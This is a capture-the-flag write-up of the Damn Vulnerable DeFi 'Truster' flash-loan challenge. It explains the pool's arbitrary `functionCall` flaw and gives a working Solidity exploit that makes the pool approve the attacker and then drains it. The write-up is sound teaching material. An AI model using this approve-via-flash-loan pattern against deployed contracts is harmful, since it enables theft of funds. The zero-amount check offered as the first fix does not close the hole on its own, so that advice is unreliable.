# Truster

**As Always please try the challenge yourself first! Use your creativity, AI tools, YouTube tutorials on the topic, whatever it takes to try and solve it!** 

## Challenge Description:

```
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.
```

In short, we need to steal the pools funds, who is giving free flashloans!
As usual each challenge highlights a specific vulnerability and tries to teach it to us by tinkering and trying to break the contract. Truster uses two bugs that together lets any bad actor steal from the contract: No amount checks, and arbitrary function calls.

## No Amount Check
Functions that deal with an amount that the user is passing in, need to check that the amount is accepted by the contract. Otherwise, they will have an open gate for vulnerabilities. Amount checks can include a minimum amount and a maximum amount. In the case of this challenge there is a lack for a amount equals 0 check.:

<details><summary>flashLoan Code Snippet</summary>

```javascript
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {

@>      //* No if (amount == 0) revert; */       <@

        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

</details>

## Arbitrary Function Call
The contract is using OpenZeppelin's library `Address`. In it there is a function called `functionCall` which uses a target contract and takes in data that includes the function we want to use in that target contract. In the context of this challenge, the pool uses it so that users can transfer back the amount the borrowed from it. However, this is done arbitrarily, which means users can pass in any target contract and any function they want!

<details><summary>flashLoan Code Snippet</summary>

```javascript
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
@>      target.functionCall(data);      <@

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

</details>
 
## How does this challenge display this vulnerability/ies?
As the attacker, we need to have an attacker mindset. When we see a code line such as `target.functionCall` something in our brain needs to flash (pun intended). We then need to look for any checks and restrictions. Once we see there are non, we check to see what can we do to use this as an exploit and steal everything. In this case, we can see that there is no check for the amount. 
Simply put here is a scenario to consider:

1. Attacker sets up the data as the `token.approve` function. 
2. Attacker calls the `flashLoan` function passing in the following parameters: 0 (as the amount), attacker (as borrower), token (as target), approve encoded(as data).
3. The function will not check for the amount which means that the balance will not change if attacker is not actually borrowing. 
4. The transfer will transfer 0 tokens. (Not actually transferring).
5. The `functionCall` will call approve in behalf of the pool, approving attacker to the pools funds.
6. Balance checks will work as non were taken.
7. Attacker transfers funds from pool as it is approved.

## Challenge Solution


```javascript
    function test_truster() public checkSolvedByPlayer {
        // 1. Setting up the data with the approve function, letting the pool approve player
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, TOKENS_IN_POOL);
        // 2. Calling flashLoan with no actual borrow amount and the malicious data
        pool.flashLoan(0, player, address(token), data);
        // 3. Stealing funds as player is approved now
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
```

## Recommendations

1. Add a amount check to make sure users cannot pass in 0 amounts. This helps with making sure there wont be any spam calls to the contract too:

<details><summary>Fix 1</summary>

```diff
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {

+       if (amount == 0){
+           revert TrusterLenderPool__InsufficientAmount();
+       }

        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);      

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

</details><br>

2. Use OpenZeppelin's libraries for Flash Loans as they have some interfaces in place that make sure that the target contract has a transfer back from flash loan.
